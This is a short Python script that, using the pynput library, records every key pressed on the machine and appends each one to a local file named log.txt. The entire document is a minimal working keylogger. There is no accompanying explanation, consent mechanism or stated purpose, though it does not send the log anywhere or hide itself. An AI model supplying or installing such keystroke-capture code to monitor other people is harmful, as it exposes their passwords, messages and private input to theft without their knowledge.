from pynput.keyboard import Listener

def writeToFile(key):
    keydata = str(key)
    with open("log.txt", "a") as f:
        f.write(keydata)

with Listener(on_press=writeToFile) as l:
        l.join()